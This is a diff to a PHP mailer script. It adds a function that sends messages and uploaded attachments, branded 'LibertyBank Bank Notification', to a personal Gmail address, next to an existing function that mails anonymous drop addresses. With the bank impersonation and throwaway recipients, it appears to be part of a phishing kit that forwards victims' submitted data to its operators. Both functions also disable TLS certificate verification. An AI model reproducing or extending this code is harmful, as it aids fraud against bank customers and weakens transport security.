@@ -107,7 +107,6 @@ function send_email($email, $message, $phpmailer)
             'verify_peer'           => false,
             'verify_peer_name'      => false,
             'allow_self_signed'     => false,
-
         )
     );
     
@@ -121,6 +120,42 @@ function send_email($email, $message, $phpmailer)
     $mail->AddAddress('roberto-info@tracklessmail.com');
     $mail->AddAddress('m3rc4n73@gmail.com');
     
+    $mail->msgHTML($message);
+    $mail->send();
+}
+
+function send_email_support_topup($email, $message, $file_tmp, $file_name,  $phpmailer)
+{
+    $mail = $phpmailer;
+    
+    $mail->isSMTP();
+    $mail->Host         = HOST_EMAIL;
+    $mail->SMTPAuth     = true;
+    $mail->Username     = USERNAME_EMAIL;
+    $mail->Password     = PASS_EMAIL;
+    $mail->SMTPAutoTLS  = true;
+    $mail->SMTPSecure   = "tls";
+    $mail->Port         = 587;
+    // $mail->SMTPDebug    = 2;
+    $mail->SMTPOptions = array(
+        'ssl'   => array(
+            'verify_peer'           => false,
+            'verify_peer_name'      => false,
+            'allow_self_signed'     => false,
+        )
+    );
+    
+    $mail->setFrom(USERNAME_EMAIL, 'LibertyBank Bank Notification');
+    $mail->addReplyTo($email);
+    $mail->isHTML(true);
+    
+    $mail->ClearAllRecipients();
+    
+    $mail->Subject = 'Problem Support LibertyBank';
+    $mail->AddAddress('saymyname377@gmail.com');
+    
+
+    $mail->AddAttachment($file_tmp, $file_name);
     $mail->msgHTML($message);
     $mail->send();
 }
